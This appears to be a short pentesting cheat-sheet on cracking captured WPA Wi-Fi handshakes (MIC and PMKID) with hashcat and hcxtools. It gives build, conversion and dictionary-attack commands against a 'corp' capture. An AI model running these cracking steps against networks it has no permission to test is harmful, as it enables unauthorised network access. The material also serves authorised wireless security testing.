[[hashcat]]
* MIC (4-way handshake)
* PMKID (1st packet/handshake)

#### Cracking MIC
```bash
git clone https://github.com/hashcat/hashcat-utils.git
cd hashcat-utils/src
make

# convert to crackable format
./cap2hccapx.bin corp_capture1-01.cap mic_to_crack.hccapx
# or https://hashcat.net/cap2hashcat/

# wpa handshake
hashcat -a 0 -m 22000 mic_to_crack.hccapx rock.txt
```
#### Cracking PMKID
https://github.com/ZerBea/hcxtools
```bash
sudo apt install hcxtools
# or
git clone https://github.com/ZerBea/hcxtools.git && cd hcxtools
make && make install
# extract hash
hcxpcapngtool cracking_pmkid.cap -o pmkidhash_corp
hashcat -a 0 -m 22000 pmkidhash_corp rock.txt
```

